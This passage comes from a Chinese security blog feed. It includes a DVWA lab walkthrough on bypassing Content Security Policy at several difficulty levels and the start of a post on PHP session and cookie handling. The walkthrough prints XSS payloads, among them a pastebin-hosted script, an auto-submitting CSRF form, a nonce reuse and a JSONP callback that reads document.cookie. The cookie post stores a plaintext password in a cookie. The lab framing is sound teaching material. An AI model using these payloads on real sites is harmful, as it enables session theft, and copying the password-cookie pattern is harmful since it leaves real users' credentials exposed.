type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;myscripts.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>src 属性规定外部脚本文件的 URL。</p><p>有时，我们需要在网站的多个页面中运行 JavaScript。不需要重复编写相同的脚本，只需在单独的文件中创建 JavaScript，并以 .js 为后缀保存，然后使用\ <script> 标签中的 src 属性引用该文件即可。</p><p><strong>注释：</strong>外部文件不能包含 <script> 标签！</p><h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><p>源码分析</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//定义script脚本执行策略，可以看到只允许本域、以及一下网站</span></span><br><span class="line">https:<span class="comment">//pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span></span><br><span class="line"><span class="comment">//设置CSP头</span></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://hastebin.com/raw/ohulaquzex</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//接受include参数</span></span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="comment">//拼接参数</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;script src=&#x27;&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;jWN8HLKe</span><br></pre></td></tr></table></figure><p><code>https://pastebin.com</code>是一个快速文本分享网站，我们可以插入我们的xss代码。</p><p>配合CSRF，诱惑用户自动触发漏洞。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;csp&quot;</span> name=<span class="string">&quot;csp&quot;</span> method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;http://192.168.1.200/DVWA-master/vulnerabilities/csp/&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;input size=<span class="string">&quot;50&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;include&quot;</span> value=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;include&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> cspb = <span class="built_in">document</span>.getElementById(<span class="string">&quot;csp&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  cspb[<span class="number">0</span>].value=<span class="string">&quot;https://pastebin.com/raw/rcBeKDgL&quot;</span>;</span><br><span class="line"> </span><br><span class="line">  cspb.submit();</span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//js脚本只允许本域、允许使用内联资源、而且设置了nonce属性</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p>构造payload</p><p>可以加载本地的script并且需要nonce值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//只能加载本地的script</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析<code>../..//vulnerabilities/csp/source/jsonp.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application&#x2F;json; charset&#x3D;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">$callback &#x3D; $_GET[&#39;callback&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp &#x3D; array (&quot;answer&quot; &#x3D;&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>high.js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建&lt;script&gt;标签，并添加src属性source/jsonp.php?callback=solveSum，其中solveSum是一个函数，用来添加anser的值。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加代码之后，会将answer的值打印出来，这里如果我们将callback的值修改为文本的值也会打印出来。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"><span class="comment">//点击按钮之后会触发clickButton函数，该函数会添加前端代码。</span></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clickButton();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201006171328103.png" alt="image-20201006171328103"></p><p>构造payload–直接赋予callback值payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Impossible.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加script代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp_impossible.php&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clickButton();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>source/jsonp_impossible.php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里没有参数值接受参数也就无法输出js代码。</span></span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$outp = array (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;solveSum (&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h2&gt;&lt;h5 id=&quot;什么是跨域&quot;&gt;&lt;a href=&quot;#什么是跨域&quot; class=&quot;headerlink&quot; title=&quot;什么是跨域?&quot;</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>session、cookie原理</title>
    <link href="http://s1eady.top/2019/06/22/session%E3%80%81cookie%E5%8E%9F%E7%90%86/"/>
    <id>http://s1eady.top/2019/06/22/session%E3%80%81cookie%E5%8E%9F%E7%90%86/</id>
    <published>2019-06-22T01:20:56.000Z</published>
    <updated>2020-10-07T02:21:12.056Z</updated>
    
    <content type="html"><![CDATA[<h3 id="session、cookie原理"><a href="#session、cookie原理" class="headerlink" title="session、cookie原理"></a>session、cookie原理</h3><h5 id="登陆前"><a href="#登陆前" class="headerlink" title="登陆前"></a>登陆前</h5><p>session_start()</p><ul><li><p>用户第一次访问文件(含有session_start函数的文件)</p><p>用户第一次访问是没有PHPSESSID,所以会创建$_SESSION变量,同时创建sess_abc123的session文件,将abc123作为PHPSESSID的值返回给浏览器</p><p>比如:</p><p>我们在从未提交过表单,也就是没有访问login.php,因此session_start函数不会触发,PHPSESSID也不会存在</p><p>cookie中不会存在任何PHPSESSID值</p><p>没有访问服务器之前,我们的请求是不会带上PHPSESSID的</p></li><li><p>用户提交表单到服务器(login.php),此时无论是否密码、账号是否正确,都会出发session_start函数,进而生成PHPSESSID值</p><p>然后我们在每一个请求服务器的时候都会带上PHPSESSID</p></li></ul><h5 id="登陆后"><a href="#登陆后" class="headerlink" title="登陆后"></a>登陆后</h5><p>登陆之后,通过以下代码设置cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;username&quot;,$username,time()+7*24*60*60); </span><br><span class="line">setcookie(&quot;code&quot;,$password,time()+7*24*60*60); </span><br></pre></td></tr></table></figure><p>我们在前端可以使用js获取到cookie值</p><h5 id="HttpOnly设置"><a href="#HttpOnly设置" class="headerlink" title="HttpOnly设置"></a>HttpOnly设置</h5><p>每个<code>cookie</code>都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过<code>cookie</code>选项来设置的，<code>cookie</code>选项包括：<code>expires</code>、<code>domain</code>、<code>path</code>、<code>secure</code>、<code>HttpOnly</code>。在设置任一个<code>cookie</code>时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**<code>分号</code><strong>和一个</strong><code>空格</code>**隔开。</p><p>这个选项用来设置<code>cookie</code>是否能通过 <code>js</code> 去访问。默认情况下，<code>cookie</code>不会带<code>httpOnly</code>选项(即为空)，所以默认情况下，客户端是可以通过<code>js</code>代码去访问（包括读取、修改、删除等）这个<code>cookie</code>的。当<code>cookie</code>带<code>httpOnly</code>选项时，客户端则无法通过<code>js</code>代码去访问（包括读取、修改、删除等）这个<code>cookie</code>。</p><h6 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h6><p>只有设置了<code>setcookie</code>的第七个参数为<code>true</code>的时候 <code>document.cookie</code>才是空的,即使在<code>php.ini</code>里面设置了<code>session.cookie_httponly=On</code>并且设置了<code>session.cookie_httponly </code>这个属性<code>(ini_set(&quot;session.cookie_httponly&quot;, 1);)</code>，但是在浏览器还是能获取到<code>cookie</code>的信息,只要<code>setcookie</code>的第七个参数不设置为<code>true</code>,<code>document.cookie</code>依然能取到值。</p><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p>login.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot;&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line"> &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt; </span><br><span class="line"> &lt;title&gt;会员登录&lt;&#x2F;title&gt; </span><br><span class="line"> &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; </span><br><span class="line">  ul li&#123;margin:0;padding:0;&#125; </span><br><span class="line">  form&#123;margin:40px 30px 0;&#125; </span><br><span class="line">  form li&#123;list-style:none;padding:5px 0;&#125; </span><br><span class="line">  form li label&#123;float:left;width:70px;text-align:right&#125; </span><br><span class="line">  form li a&#123;font-size:12px;color:#999;text-decoration:none&#125; </span><br><span class="line">  .login_btn&#123;border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;&#125; </span><br><span class="line">  form li img&#123;vertical-align:top&#125; </span><br><span class="line"> &lt;&#x2F;style&gt; </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt; </span><br><span class="line"> &lt;fieldset&gt; </span><br><span class="line">  &lt;legend&gt;用户登录&lt;&#x2F;legend&gt; </span><br><span class="line">  &lt;ul&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt;用户名:&lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt;密码:&lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;remember&quot; value&#x3D;&quot;yes&quot;&#x2F;&gt;7天内自动登录 </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;login&quot; value&#x3D;&quot;登录&quot; class&#x3D;&quot;login_btn&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">  &lt;&#x2F;ul&gt; </span><br><span class="line"> &lt;&#x2F;fieldset&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;); </span><br><span class="line"> session_start(); </span><br><span class="line"> if(isset($_POST[&#39;login&#39;])) </span><br><span class="line"> &#123; </span><br><span class="line">  $username &#x3D; trim($_POST[&#39;username&#39;]); </span><br><span class="line">  $password &#x3D; trim($_POST[&#39;password&#39;]); </span><br><span class="line">  if(($username&#x3D;&#x3D;&#39;&#39;)||($password&#x3D;&#x3D;&#39;&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;login.html&#39;); </span><br><span 